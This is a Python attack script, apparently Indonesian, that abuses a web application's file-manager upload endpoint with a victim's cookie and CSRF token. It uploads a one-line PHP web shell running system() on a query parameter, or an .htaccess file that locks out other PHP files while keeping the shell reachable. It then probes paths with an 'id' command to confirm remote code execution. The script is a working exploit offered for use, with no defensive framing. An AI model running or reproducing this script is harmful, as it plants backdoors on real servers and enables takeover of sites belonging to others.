import requests
import urllib3
import os

# Matikan peringatan SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Warna Terminal
GREEN = '\033[92m'
RED = '\033[91m'
CYAN = '\033[96m'
YELLOW = '\033[93m'
RESET = '\033[0m'
BOLD = '\033[1m'

class IceCreamExploiter:
    def __init__(self):
        self.session = requests.Session()
        self.banner()
        self.target = input(f"{BOLD}{CYAN}Target URL: {RESET}").rstrip('/')
        self.cookie = input(f"{BOLD}{CYAN}Cookie Lengkap: {RESET}")
        self.csrf = input(f"{BOLD}{CYAN}X-CSRF-TOKEN: {RESET}")

        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
            'X-Requested-With': 'XMLHttpRequest',
            'Accept': 'application/json',
            'X-CSRF-TOKEN': self.csrf,
            'Cookie': self.cookie,
            'Referer': f"{self.target}/file-manager/full-screen"
        }
        
        # Step 1: Deteksi Disk secara otomatis
        self.disk = self.auto_detect_disk()

    def banner(self):
        os.system('clear')
        print(f"""{BOLD}{GREEN}
    __                          
   / /   ____ __________ __   _____  / /
  / /   / __ `/ ___/ __ `/ | / / _ \/ / 
 / /___/ /_/ / /  / /_/ /| |/ /  __/ /  
/_____/\__,_/_/   \__,_/ |___/\___/_/   
                                        
    {YELLOW}Version: 3.6 (Fixed Syntax & Multiline Payload)
    Author: github.com/banyaksepuh{RESET}
        """)

    def auto_detect_disk(self):
        print(f"[*] Menghubungi /initialize...")
        try:
            r = self.session.get(f"{self.target}/file-manager/initialize", headers=self.headers, verify=False, timeout=10)
            if r.status_code == 200:
                disks = r.json().get('config', {}).get('disks', {})
                if disks:
                    d_name = list(disks.keys())[0]
                    print(f"{GREEN}[+] Disk Terdeteksi: {d_name}{RESET}")
                    return d_name
            return "public"
        except: return "public"

    def scan_directories(self):
        print(f"[*] Scanning folders on disk '{self.disk}'...")
        params = {'disk': self.disk, 'path': ''}
        try:
            r = self.session.get(f"{self.target}/file-manager/content", headers=self.headers, params=params, verify=False)
            resp = r.json()
            items = resp if isinstance(resp, list) else resp.get('directories', [])
            dirs = [i.get('path') for i in items if i.get('type') == 'dir']
            
            print(f"\n{YELLOW}--- DAFTAR FOLDER ---{RESET}")
            print(f"{CYAN}[0] / (Root Storage){RESET}")
            for idx, folder in enumerate(dirs, 1):
                print(f"{CYAN}[{idx}] /{folder}{RESET}")
            dirs.insert(0, "")
            return dirs
        except: return [""]

    def execute(self):
        dirs = self.scan_directories()
        f_idx = input(f"\n{BOLD}{YELLOW}Pilih Nomor Folder > {RESET}")
        path_target = dirs[int(f_idx)] if f_idx.isdigit() and int(f_idx) < len(dirs) else ""

        print(f"\n{YELLOW}[1] phtml  [2] php  [3] .htaccess{RESET}")
        choice = input(f"{BOLD}{YELLOW}Pilih Payload > {RESET}")
        
        filename = "urdick.php"
        content = "<?php system($_GET['x']); ?>"
        
        if choice == '1': filename = "urdick.phtml"
        if choice == '3':
            filename = ".htaccess"
            # Pakai kutip tiga agar support multiline
            content = """<Files *.ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.a*>
    Order Deny,Allow
    Deny from all
</Files>
<FilesMatch "^(index.html|index.php|lol.php|urdick.php|lol3.php)$">
    Order allow,deny
    Allow from all
</FilesMatch>
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /
    RewriteRule ^index.php$ - [L]
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule . /index.php [L]
</IfModule>
ErrorDocument 403 /index.php
ErrorDocument 404 /index.php"""

        # Kirim File
        data = {'disk': self.disk, 'path': path_target, 'overwrite': '1'}
        files = {'files[]': (filename, content, 'application/octet-stream')}

        print(f"\n[*] Uploading {filename} to /{path_target} (Disk: {self.disk})...")
        try:
            r = self.session.post(f"{self.target}/file-manager/upload", headers=self.headers, data=data, files=files, verify=False)
            
            if r.status_code == 200:
                print(f"\n{BOLD}{GREEN}[+] UPLOAD BERHASIL!{RESET}")
                f_path = f"{path_target}/{filename}" if path_target else filename
                potential_urls = [
                    f"{self.target}/{self.disk}/{f_path}",
                    f"{self.target}/storage/{f_path}",
                    f"{self.target}/{f_path}"
                ]

                print(f"{BOLD}{YELLOW}[*] Mengetes jalur akses...{RESET}")
                for url in potential_urls:
                    test = requests.get(f"{url}?x=id", verify=False, timeout=5)
                    if test.status_code == 200:
                        print(f"{GREEN}[FOUND] -> {url}?x=id{RESET}")
                        return
                    else:
                        print(f"{RED}[404/Fail] -> {url}{RESET}")
            else:
                print(f"{RED}[-] Gagal! Status: {r.status_code}{RESET}")
                print(f"{RED}[-] Respon: {r.text[:200]}{RESET}")
        except Exception as e:
            print(f"{RED}[-] Error: {e}{RESET}")

if __name__ == "__main__":
    IceCreamExploiter().execute()
